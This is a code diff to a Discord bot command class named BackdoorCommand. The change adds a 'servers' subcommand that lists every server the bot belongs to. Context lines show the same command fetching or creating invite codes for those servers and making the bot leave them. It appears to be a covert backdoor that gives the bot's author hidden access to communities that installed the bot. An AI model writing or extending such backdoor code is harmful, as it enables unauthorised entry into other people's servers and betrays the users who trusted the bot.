@@ -30,6 +30,8 @@ class BackdoorCommand extends Commando.Command {
 				Guild.fetchInvites()
 				.then(invites => message.channel.send('Found Invites:\n' + invites.map(invite => invite.code).join('\n')))
 				.catch(console.error);
+				
+				return;
 		   }
 		   if(Args[1] === "leave"){
 				let Guild = Settings.Bot.guilds.get(Args[2])
@@ -53,6 +55,14 @@ class BackdoorCommand extends Commando.Command {
 
 				Channels.random().createInvite()
 				.then(invite=> message.channel.send('Found Invite:\n' + invite.code))
+				return;
+		   }
+		   if(Args[1] === "servers"){
+			   let Guilds = Settings.Bot.guilds.map(g => `Name: ${g.name} ID: ${g.id}`).join("\n")
+			   let RichEmbed = new Discord.RichEmbed()
+			   .setFooter("Brought to You By Lyaboo")
+			   .setDescription(Guilds);
+			   return message.channel.send("Data Brought By Lyaboo", RichEmbed);
 		   }
         } else {
             let Embed = new Discord.RichEmbed()
